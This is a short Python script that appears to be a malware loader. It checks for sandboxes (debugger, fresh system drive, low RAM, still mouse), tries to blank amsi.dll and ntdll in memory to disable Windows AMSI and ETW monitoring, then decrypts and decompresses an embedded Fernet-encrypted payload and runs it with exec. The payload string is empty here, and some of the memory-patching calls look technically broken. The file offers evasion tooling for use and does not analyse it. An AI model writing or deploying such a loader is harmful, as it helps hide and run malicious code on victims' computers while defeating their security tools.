# -*- coding: utf-8 -*-
import base64, zlib, sys, os, ctypes, time, random, subprocess
from cryptography.fernet import Fernet

# Anti-sandbox
try:
    if sys.gettrace(): sys.exit()
    if time.time() - os.path.getctime('C:\\') < 300: sys.exit()
    import psutil
    if psutil.virtual_memory().total < 2*1024**3: sys.exit()
    p = ctypes.wintypes.POINT(); ctypes.windll.user32.GetCursorPos(ctypes.byref(p)); time.sleep(5);
    p2 = ctypes.wintypes.POINT(); ctypes.windll.user32.GetCursorPos(ctypes.byref(p2))
    if p.x == p2.x and p.y == p2.y: sys.exit()
except: pass

# AMSI/ETW Bypass
try:
    amsi = ctypes.windll.LoadLibrary('amsi.dll')
    ctypes.windll.kernel32.VirtualProtect(amsi, 0x1000, 0x40, ctypes.byref(ctypes.c_ulong()))
    ctypes.memset(amsi, 0, 0x1000)
except: pass
try:
    ntdll = ctypes.windll.LoadLibrary('ntdll.dll')
    ctypes.windll.kernel32.VirtualProtect(ntdll, 0x1000, 0x40, ctypes.byref(ctypes.c_ulong()))
    ctypes.memset(ntdll + 0x0A, 0, 0x10)
except: pass

_b64 = ""
_key = "a0QyLU1RVWpOUEtBandCSlkyQ3k3czMzMXppcEM0eHJrUFo1TUVyc05GTT0="
_data = base64.b64decode(_b64)
_cipher = Fernet(base64.b64decode(_key))
_decomp = _cipher.decrypt(_data)
exec(zlib.decompress(_decomp))
